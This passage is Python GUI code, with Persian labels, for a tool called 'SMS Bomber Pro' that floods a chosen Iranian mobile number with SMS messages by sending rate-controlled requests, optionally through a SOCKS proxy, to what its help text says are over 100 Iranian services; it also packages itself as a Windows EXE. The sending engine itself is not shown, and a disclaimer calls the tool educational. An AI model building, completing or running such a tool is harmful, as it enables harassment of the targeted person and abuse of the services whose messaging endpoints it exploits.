        ctk.CTkLabel(settings_frame, text=":(req/s) نرخ ارسال", anchor="e").grid(row=2, column=1, padx=(10,20), pady=5, sticky="e")
        self.rate_slider = ctk.CTkSlider(settings_frame, from_=1, to=20, number_of_steps=19, command=self.update_rate_label)
        self.rate_slider.set(20)
        self.rate_slider.grid(row=2, column=0, padx=(20,10), pady=5, sticky="ew")
        self.rate_label = ctk.CTkLabel(settings_frame, text="20 req/s", anchor="w")
        self.rate_label.grid(row=2, column=2, padx=(10,20), sticky="w")

        ctk.CTkLabel(settings_frame, text=":(خالی = نامحدود) تعداد پیامک موفق هدف", anchor="e").grid(row=3, column=1, padx=(10,20), pady=5, sticky="e")
        self.target_entry = ctk.CTkEntry(settings_frame, placeholder_text="مثال: 100", width=100, justify="right")
        self.target_entry.grid(row=3, column=0, padx=(20,10), pady=5, sticky="w")

        ctk.CTkLabel(settings_frame, text=":ظاهر", anchor="e").grid(row=4, column=1, padx=(10,20), pady=5, sticky="e")
        self.appearance_mode_menu = ctk.CTkOptionMenu(settings_frame, values=["Dark", "Light", "System"],
                                                      command=self.change_appearance_mode)
        self.appearance_mode_menu.set("Dark")
        self.appearance_mode_menu.grid(row=4, column=0, padx=(20,10), pady=5, sticky="w")

        btn_frame = ctk.CTkFrame(self)
        btn_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        btn_frame.grid_columnconfigure(0, weight=1)
        btn_frame.grid_columnconfigure(1, weight=1)
        btn_frame.grid_columnconfigure(2, weight=1)
        btn_frame.grid_columnconfigure(3, weight=1)

        self.start_btn = ctk.CTkButton(btn_frame, text="▶ شروع ارسال", command=self.start_attack,
                                       fg_color="#2E8B57", hover_color="#3CB371")
        self.start_btn.grid(row=0, column=3, padx=5, pady=5, sticky="e")

        self.stop_btn = ctk.CTkButton(btn_frame, text="⏹ توقف", command=self.stop_attack,
                                      state="disabled", fg_color="#B22222", hover_color="#CD5C5C")
        self.stop_btn.grid(row=0, column=2, padx=5, pady=5, sticky="e")

        self.build_btn = ctk.CTkButton(btn_frame, text="🛠 ساخت فایل EXE", command=self.build_exe)
        self.build_btn.grid(row=0, column=1, padx=5, pady=5, sticky="e")

        self.help_btn = ctk.CTkButton(btn_frame, text="❓ راهنما", command=self.show_help)
        self.help_btn.grid(row=0, column=0, padx=5, pady=5, sticky="e")

        stats_frame = ctk.CTkFrame(self)
        stats_frame.grid(row=3, column=0, padx=20, pady=10, sticky="ew")
        stats_frame.grid_columnconfigure((0,1,2,3,4), weight=1)

        self.total_var = ctk.StringVar(value="کل: 0")
        self.success_var = ctk.StringVar(value="موفق: 0")
        self.fail_var = ctk.StringVar(value="خطا: 0")
        self.rate_var = ctk.StringVar(value="نرخ: 0 req/s")
        self.percent_var = ctk.StringVar(value="موفقیت: 0%")

        ctk.CTkLabel(stats_frame, textvariable=self.percent_var, font=ctk.CTkFont(size=12), anchor="e").grid(row=0, column=4, padx=5, pady=5, sticky="e")
        ctk.CTkLabel(stats_frame, textvariable=self.rate_var, font=ctk.CTkFont(size=12), anchor="e").grid(row=0, column=3, padx=5, pady=5, sticky="e")
        ctk.CTkLabel(stats_frame, textvariable=self.fail_var, font=ctk.CTkFont(size=12, weight="bold"), text_color="red", anchor="e").grid(row=0, column=2, padx=5, pady=5, sticky="e")
        ctk.CTkLabel(stats_frame, textvariable=self.success_var, font=ctk.CTkFont(size=12, weight="bold"), text_color="green", anchor="e").grid(row=0, column=1, padx=5, pady=5, sticky="e")
        ctk.CTkLabel(stats_frame, textvariable=self.total_var, font=ctk.CTkFont(size=12, weight="bold"), anchor="e").grid(row=0, column=0, padx=5, pady=5, sticky="e")

        self.progress = ctk.CTkProgressBar(self, orientation="horizontal", mode="indeterminate")
        self.progress.grid(row=4, column=0, padx=20, pady=5, sticky="ew")
        self.progress.set(0)

        self.log_textbox = ctk.CTkTextbox(self, height=150, font=ctk.CTkFont(size=11))
        self.log_textbox.grid(row=5, column=0, padx=20, pady=10, sticky="nsew")

        self.status_label = ctk.CTkLabel(self, text="آماده", anchor="e")
        self.status_label.grid(row=6, column=0, padx=20, pady=5, sticky="ew")

    def update_rate_label(self, value):
        self.rate_label.configure(text=f"{int(float(value))} req/s")

    def change_appearance_mode(self, new_mode: str):
        ctk.set_appearance_mode(new_mode)

    def log(self, message):
        self.log_textbox.insert(END, f"[{time.strftime('%H:%M:%S')}] {message}\n")
        self.log_textbox.see(END)

    def start_attack(self):
        phone = self.phone_entry.get().strip()
        if not (phone.startswith("09") and len(phone) == 11 and phone.isdigit()):
            messagebox.showerror("خطا", "شماره موبایل باید با 09 شروع و 11 رقم باشد.")
            return

        proxy = self.proxy_entry.get().strip() or None
        if proxy and proxy.startswith("socks"):
            try:
                import socks
            except ImportError:
                self.log("📦 نصب PySocks برای پشتیبانی از SOCKS...")
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "PySocks"])
                    self.log("✅ PySocks نصب شد.")
                except Exception as e:
                    self.log(f"❌ خطا در نصب PySocks: {e}")
                    messagebox.showerror("خطا", "نصب PySocks ناموفق بود.")
                    return

        rate = float(self.rate_slider.get())
        target_str = self.target_entry.get().strip()
        success_target = None
        if target_str:
            if not target_str.isdigit() or int(target_str) <= 0:
                messagebox.showerror("خطا", "تعداد هدف باید عدد صحیح مثبت باشد.")
                return
            success_target = int(target_str)

        self.start_btn.configure(state="disabled")
        self.stop_btn.configure(state="normal")
        self.build_btn.configure(state="disabled")

        self.total_var.set("کل: 0")
        self.success_var.set("موفق: 0")
        self.fail_var.set("خطا: 0")
        self.rate_var.set("نرخ: 0 req/s")
        self.percent_var.set("موفقیت: 0%")
        self.progress.set(0)
        self.log_textbox.delete("1.0", END)

        self.progress.configure(mode="indeterminate")
        self.progress.start()

        self.status_label.configure(text="در حال ارسال...")

        self.engine = Engine(phone, proxy, rate, success_target, log_callback=self.log)
        self.thread = threading.Thread(target=self._run_engine, daemon=True)
        self.thread.start()

    def _run_engine(self):
        def update_stats(stats, start_time):
            self.after(0, self._update_gui, stats, start_time)

        self.engine.run_all(update_callback=update_stats)
        self.after(0, self._attack_finished)

    def _update_gui(self, stats, start_time):
        elapsed = time.time() - start_time
        req_per_sec = stats["total"] / elapsed if elapsed > 0 else 0
        success_percent = (stats["success"] / stats["total"] * 100) if stats["total"] > 0 else 0

        self.total_var.set(f"کل: {stats['total']}")
        self.success_var.set(f"موفق: {stats['success']}")
        self.fail_var.set(f"خطا: {stats['fail']}")
        self.rate_var.set(f"نرخ: {req_per_sec:.1f} req/s")
        self.percent_var.set(f"موفقیت: {success_percent:.1f}%")

    def _attack_finished(self):
        self.start_btn.configure(state="normal")
        self.stop_btn.configure(state="disabled")
        self.build_btn.configure(state="normal")
        self.progress.stop()
        self.progress.configure(mode="determinate")
        self.progress.set(1)
        self.status_label.configure(text="پایان عملیات")
        messagebox.showinfo("پایان", "عملیات به اتمام رسید.")

    def stop_attack(self):
        if self.engine:
            self.engine.stop()
        self.stop_btn.configure(state="disabled")

    def build_exe(self):
        try:
            importlib.import_module("PyInstaller")
        except ImportError:
            if messagebox.askyesno("نصب PyInstaller", "PyInstaller یافت نشد. نصب شود؟"):
                self.log("در حال نصب PyInstaller...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
            else:
                return

        script_path = sys.argv[0] if sys.argv[0].endswith(".py") else __file__
        if not script_path:
            messagebox.showerror("خطا", "فایل اسکریپت یافت نشد.")
            return

        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile", "--windowed",
            "--name", "SMS_Bomber_Pro",
            script_path
        ]
        self.log("شروع ساخت EXE...")
        try:
            subprocess.run(cmd, check=True)
            self.log("EXE با موفقیت ساخته شد. پوشه dist را بررسی کنید.")
            messagebox.showinfo("موفقیت", "فایل EXE در پوشه dist ایجاد شد.")
        except subprocess.CalledProcessError as e:
            self.log(f"خطا در ساخت EXE: {e}")
            messagebox.showerror("خطا", "ساخت EXE با مشکل مواجه شد.")

    def show_help(self):
        help_window = ctk.CTkToplevel(self)
        help_window.title("راهنما")
        help_window.geometry("750x600")
        help_window.attributes("-topmost", True)

        textbox = ctk.CTkTextbox(help_window, font=ctk.CTkFont(size=12), wrap="word")
        textbox.pack(fill="both", expand=True, padx=10, pady=10)

        help_text = """
📘 راهنمای کامل SMS Bomber Pro (نسخه آموزشی)

⚠️ هشدار حقوقی:
این نرم‌افزار صرفاً برای اهداف آموزشی، تست نفوذ مجاز و ارزیابی امنیتی طراحی شده است.
استفاده از آن برای مزاحمت، ارسال پیامک انبوه ناخواسته، یا هرگونه فعالیت غیرقانونی اکیداً ممنوع می‌باشد.
مسئولیت هرگونه سوءاستفاده بر عهده کاربر است.

📱 بخش‌های اصلی:
1. شماره موبایل مقصد (حتماً با 09 شروع شود)
2. پروکسی (اختیاری) – مثال: socks5://127.0.0.1:9050
3. نرخ ارسال (درخواست در ثانیه) – بین ۱ تا ۲۰. پیش‌فرض ۵.
4. تعداد پیامک موفق هدف: اگر عددی وارد کنید، برنامه پس از رسیدن به همان تعداد متوقف می‌شود.
   اگر خالی بگذارید، تا بستن پنجره ادامه می‌یابد.

📊 آمار لحظه‌ای:
- تعداد کل، موفق، خطا، نرخ واقعی، درصد موفقیت

🛠 ساخت EXE:
با کلیک روی دکمه مربوطه، فایل اجرایی مستقل ویندوز ساخته می‌شود.

⚙️ نکات فنی:
- Token Bucket نرخ را دقیقاً کنترل می‌کند.
- تمام درخواست‌ها همزمان ثبت شده و به تدریج اجرا می‌شوند.
- بیش از ۱۰۰ سرویس ایرانی استفاده می‌شود.

🚫 محدودیت‌ها:
- فقط شماره‌های ایران (09xxx)
- برخی سرویس‌ها ممکن است به دلیل تغییرات API پاسخ ندهند.
        """
        textbox.insert("0.0", help_text)
        textbox.configure(state="disabled")

if __name__ == "__main__":
    app = SMSBomberGUI()
    app.mainloop()